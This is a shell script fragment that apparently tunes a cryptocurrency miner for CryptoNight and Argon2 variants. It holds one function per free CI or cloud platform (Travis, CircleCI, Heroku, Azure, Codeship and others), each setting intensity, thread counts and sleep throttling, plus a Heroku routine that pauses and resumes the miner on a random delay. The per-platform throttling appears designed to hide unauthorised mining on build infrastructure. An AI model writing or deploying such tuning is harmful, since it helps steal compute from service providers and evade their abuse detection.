## tuning for third party services

tune_thirdparty() {
    export base threads provider
    export mhf=$cMhf csleep=$CSLEEP
    if type "$provider"; then
        log "tune_thirdparty - provider: $provider"
        $provider
    else
        log "no provider available skipping 3rd party tuning"
        return 1
    fi

    cMhf=${mhf:-$cMhf}
    cThr=${threads:-$cThr}
    ## use change config to override MHF_FIXED
    change_config intensity "$cMhf"
    change_config threads "$cThr"
    if [ "$csleep" != "$CSLEEP" ]; then
        if [ "$csleep" -gt 0 ] && [ "$CSLEEP" = 0 ]; then
            CSLEEP=1
        else
            CSLEEP=$csleep
        fi
        change_config sleep $CSLEEP
    fi
    return 0
}

should_exec() {
    case "${provider}" in
        heroku) return 1
                ;;
        *) return 0
           ;;
    esac

}

travis() {
    case "$job_algo" in
        "cn-heavy")
            mhf=1
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=4
            threads=2
            ;;
        "cn-pico"|"cn-femto"|"argon2")
            mhf=2
            threads=2
            ;;
    esac
}

bitrise() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=4
            threads=1
            ;;
        "cn-pico"|"cn-femto"|"argon2")
            mhf=2
            threads=2
            ;;
    esac
}

circleci() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=5
            threads=1
            ;;
        "cn-pico")
            mhf=2
            threads=2
            csleep=2000
            ;;
        "cn-femto")
            mhf=2
            threads=2
            csleep=133
            ;;
        "argon2")
            mhf=2
            threads=2
            csleep=30
            ;;
    esac
}

codefresh() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=2
            ;;
        "cn")
            mhf=2
            threads=2
            ;;
        "cn-lite")
            mhf=4
            threads=2
            ;;
        "cn-pico"|"cn-femto")
            mhf=2
            threads=3
            ;;
        "argon2")
            mhf=2
            threads=4
            ;;
    esac
}

codeship() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=2
            ;;
        "cn")
            mhf=2
            threads=4
            ;;
        "cn-lite")
            mhf=4
            threads=4
            ;;
        "cn-pico")
            mhf=2
            threads=4
            csleep=4000
            ;;
        "argon2")
            mhf=2
            threads=4
            csleep=1000
            ;;
        "cn-femto")
            mhf=2
            threads=4
            csleep=266
            ;;
    esac
}

cphp() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=5
            threads=1
            ;;
        "cn-pico"|"cn-femto"|"argon2")
            mhf=2
            threads=2
            ;;
    esac
}

docker(){
    case "$job_algo" in
        "cn-heavy")
            mhf=1
            threads=1
            ;;
        "cn")
            mhf=2
            threads=1
            ;;
        "cn-lite")
            mhf=4
            threads=1
            ;;
        "cn-pico"|"cn-femto"|"argon2")
            mhf=2
            threads=1
            ;;
    esac
}

quay() {
        case "$job_algo" in
            "cn-heavy")
                mhf=1
                threads=2
                ;;
            "cn")
                mhf=2
                threads=4
                ;;
            "cn-lite")
                mhf=3
                threads=2
                ;;
            "cn-pico"|"cn-femto"|"argon2")
                mhf=2
                threads=2
                ;;
        esac
}

drone() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=2
            ;;
        "cn")
            mhf=2
            threads=4
            ;;
        "cn-lite")
            mhf=4
            threads=2
            ;;
        "cn-pico"|"cn-femto"|"argon2")
            mhf=2
            threads=2
            ;;
    esac
}

semaphore() {
    case "$job_algo" in
        "cn-heavy")
            mhf=1
            threads=2
            ;;
        "cn")
            mhf=1
            threads=4
            ;;
        "cn-lite")
            mhf=2
            threads=4
            ;;
        "cn-pico"|"cn-femto"|"argon2")
            mhf=2
            [ "$CORES" = 2 ] && threads=2 || threads=4
            ;;
    esac
}

wercker() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=2
            ;;
        "cn")
            mhf=3
            threads=4
            ;;
        "cn-lite")
            mhf=4
            threads=4
            ;;
        "cn-pico"|"cn-femto"|"argon2")
            mhf=2
            threads=4
            ;;
    esac
}

appv() {
    {
        case "$job_algo" in
            "cn-heavy")
                mhf=3
                threads=1
                csleep=75000
                ;;
            "cn")
                mhf=3
                threads=2
                csleep=50000
                ;;
            "cn-lite")
                mhf=4
                threads=2
                csleep=30000
                ;;
            "cn-pico")
                mhf=2
                threads=2
                csleep=6666
                ;;
            "argon2")
                mhf=2
                threads=2
                csleep=2222
                ;;
            "cn-femto")
                mhf=2
                threads=2
                csleep=1333
                ;;
        esac
    }
}

azure() {
    case "$job_algo" in
        "cn-heavy")
            mhf=3
            threads=2
            ;;
        "cn")
            mhf=4
            threads=2
            ;;
        "cn-lite")
            mhf=5
            threads=2
            ;;
        "cn-pico"|"cn-femto")
            mhf=2
            threads=2
            ;;
    esac
}

heroku() {
        case "$job_algo" in
            "cn-heavy")
                mhf=1
                threads=1
                csleep=24000
                ;;
            "cn")
                mhf=2
                threads=1
                csleep=16000
                ;;
            "cn-lite")
                mhf=4
                threads=2
                csleep=32000
                ;;
            "cn-pico")
                mhf=2
                threads=8
                csleep=50000
                ;;
            "cn-femto")
                mhf=2
                threads=8
                csleep=72000
                ;;
        esac
}

oc() {
    case "$job_algo" in
        "cn-heavy")
            mhf=1
            threads=2
            ;;
        "cn")
            mhf=2
            threads=2
            ;;
        "cn-lite")
            mhf=4
            threads=2
            ;;

        "cn-pico"|"cn-femto")
            mhf=2
            threads=4
            ;;
    esac
}



buddy() {
    case "$job_algo" in
        "cn-heavy")
            mhf=2
            threads=2
            ;;
        "cn")
            mhf=3
            threads=2
            ;;
        "cn-lite")
            mhf=5
            threads=2
            ;;
        "cn-pico"|"cn-femto")
            mhf=2
            threads=2
            ;;
    esac
}

heroku_start(){
    pause
    fleep $((RANDOM%10+20))
    resume
}
